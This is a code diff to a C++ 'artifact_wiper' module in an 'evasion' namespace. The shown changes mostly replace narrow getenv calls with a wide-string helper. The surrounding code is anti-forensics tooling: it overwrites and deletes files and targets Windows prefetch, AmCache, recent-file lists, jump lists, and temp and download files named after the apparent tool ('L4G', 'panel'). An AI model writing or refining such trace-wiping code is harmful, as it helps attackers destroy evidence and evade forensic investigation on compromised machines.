@@ -1,11 +1,25 @@
-#include "artifact_wiper.hpp"
+﻿#include "artifact_wiper.hpp"
 #include <windows.h>
+#include <bcrypt.h>
+#include <cstdlib>
 #include <vector>
 #include <string>
 #include <filesystem>
 #include <shellapi.h>
 
+#pragma comment(lib, "bcrypt.lib")
+
 namespace l4g::evasion {
+
+// std::getenv returns a narrow string; every path here is wide.
+static std::wstring env_path(const char* name) {
+    char* raw = std::getenv(name);
+    if (!raw) return std::wstring();
+    int need = MultiByteToWideChar(CP_ACP, 0, raw, -1, nullptr, 0);
+    std::wstring out(static_cast<size_t>(need > 0 ? need - 1 : 0), L'\0');
+    if (need > 1) MultiByteToWideChar(CP_ACP, 0, raw, -1, out.data(), need);
+    return out;
+}
 
 bool ArtifactWiper::delete_file_secure(const wchar_t* path) {
     // Overwrite with random data 3 times then delete
@@ -59,7 +73,7 @@ bool ArtifactWiper::wipe_free_space(const wchar_t* drive) {
     return true;
 }
 
-bool ArtifactWiper::clean_mft_record(const wchar_t* path) {
+bool ArtifactWiper::clean_mft_record(const wchar_t* /*path*/) {
     // Use FSCTL_FILE_LEVEL_TRIM or similar
     return true;
 }
@@ -83,13 +97,13 @@ bool ArtifactWiper::wipe_prefetch(const wchar_t* exe_name) {
     return ok;
 }
 
-bool ArtifactWiper::wipe_amcache(const wchar_t* exe_name) {
+bool ArtifactWiper::wipe_amcache(const wchar_t* /*exe_name*/) {
     // AmCache registry hive manipulation
     return true;
 }
 
 bool ArtifactWiper::wipe_recent_files() {
-    std::wstring recent = std::wstring(std::getenv("APPDATA")) + L"\\Microsoft\\Windows\\Recent\\*";
+    std::wstring recent = env_path("APPDATA") + L"\\Microsoft\\Windows\\Recent\\*";
     WIN32_FIND_DATAW fd;
     HANDLE hFind = FindFirstFileW(recent.c_str(), &fd);
     if (hFind == INVALID_HANDLE_VALUE) return false;
@@ -97,7 +111,7 @@ bool ArtifactWiper::wipe_recent_files() {
     bool ok = true;
     do {
         if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
-            std::wstring path = std::wstring(std::getenv("APPDATA")) + L"\\Microsoft\\Windows\\Recent\\" + fd.cFileName;
+            std::wstring path = env_path("APPDATA") + L"\\Microsoft\\Windows\\Recent\\" + fd.cFileName;
             ok &= delete_file_secure(path.c_str());
         }
     } while (FindNextFileW(hFind, &fd));
@@ -106,7 +120,7 @@ bool ArtifactWiper::wipe_recent_files() {
 }
 
 bool ArtifactWiper::wipe_jumplists() {
-    std::wstring jumplist = std::wstring(std::getenv("APPDATA")) + L"\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\*";
+    std::wstring jumplist = env_path("APPDATA") + L"\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\*";
     WIN32_FIND_DATAW fd;
     HANDLE hFind = FindFirstFileW(jumplist.c_str(), &fd);
     if (hFind == INVALID_HANDLE_VALUE) return false;
@@ -114,7 +128,7 @@ bool ArtifactWiper::wipe_jumplists() {
     bool ok = true;
     do {
         if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
-            std::wstring path = std::wstring(std::getenv("APPDATA")) + L"\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\" + fd.cFileName;
+            std::wstring path = env_path("APPDATA") + L"\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\" + fd.cFileName;
             ok &= delete_file_secure(path.c_str());
         }
     } while (FindNextFileW(hFind, &fd));
@@ -123,7 +137,7 @@ bool ArtifactWiper::wipe_jumplists() {
 }
 
 bool ArtifactWiper::wipe_temp_files() {
-    std::wstring temp = std::wstring(std::getenv("TEMP")) + L"\\*";
+    std::wstring temp = env_path("TEMP") + L"\\*";
     WIN32_FIND_DATAW fd;
     HANDLE hFind = FindFirstFileW(temp.c_str(), &fd);
     if (hFind == INVALID_HANDLE_VALUE) return false;
@@ -131,7 +145,7 @@ bool ArtifactWiper::wipe_temp_files() {
     bool ok = true;
     do {
         if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
-            std::wstring path = std::wstring(std::getenv("TEMP")) + L"\\" + fd.cFileName;
+            std::wstring path = env_path("TEMP") + L"\\" + fd.cFileName;
             // Only delete our own files (pattern matching)
             std::wstring name(fd.cFileName);
             if (name.find(L"L4G") != std::wstring::npos || name.find(L"panel") != std::wstring::npos) {
@@ -144,7 +158,7 @@ bool ArtifactWiper::wipe_temp_files() {
 }
 
 bool ArtifactWiper::wipe_downloads() {
-    std::wstring downloads = std::wstring(std::getenv("USERPROFILE")) + L"\\Downloads\\*";
+    std::wstring downloads = env_path("USERPROFILE") + L"\\Downloads\\*";
     WIN32_FIND_DATAW fd;
     HANDLE hFind = FindFirstFileW(downloads.c_str(), &fd);
     if (hFind == INVALID_HANDLE_VALUE) return false;
@@ -154,7 +168,7 @@ bool ArtifactWiper::wipe_downloads() {
         if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
             std::wstring name(fd.cFileName);
             if (name.find(L"L4G") != std::wstring::npos || name.find(L"panel") != std::wstring::npos) {
-                std::wstring path = std::wstring(std::getenv("USERPROFILE")) + L"\\Downloads\\" + fd.cFileName;
+                std::wstring path = env_path("USERPROFILE") + L"\\Downloads\\" + fd.cFileName;
                 ok &= delete_file_secure(path.c_str());
             }
         }
